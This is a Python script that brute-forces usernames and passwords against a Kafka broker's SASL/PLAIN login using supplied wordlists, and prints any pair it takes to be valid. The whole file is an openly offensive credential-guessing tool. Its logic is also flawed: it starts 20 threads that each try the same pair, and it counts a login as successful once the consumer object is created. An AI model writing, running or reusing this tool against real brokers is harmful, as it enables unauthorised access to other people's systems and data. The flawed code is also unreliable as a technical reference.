import sys
from kafka import KafkaConsumer
import threading

def try_password(nickname, password):
    try:
        con = KafkaConsumer(
            bootstrap_servers=bootstrap_servers,
            security_protocol="SASL_PLAINTEXT",
            sasl_mechanism='PLAIN',
            sasl_plain_username=nickname,
            sasl_plain_password=password.strip()
        )
        global found_password
        found_password = password.strip()
        print("Nickname: {}, Password: {}".format(nickname, password.strip()))
    except Exception:
        pass

bootstrap_servers = sys.argv[1]
nickname_file = sys.argv[2]
password_file = sys.argv[3]

with open(nickname_file, "r") as file:
    nicknames = file.readlines()

with open(password_file, "r") as file:
    passwords = file.readlines()

for nickname in nicknames:
    for password in passwords:
        found_password = None
        threads = []
        for i in range(20):
            t = threading.Thread(target=try_password, args=(nickname.strip(), password))
            threads.append(t)
            t.start()
        for t in threads:
            t.join()
        if found_password:
            print("Password found for nickname {}: {}".format(nickname.strip(), found_password))
            sys.exit()

print("No valid nickname/password combinations found in the files.")
sys.exit()
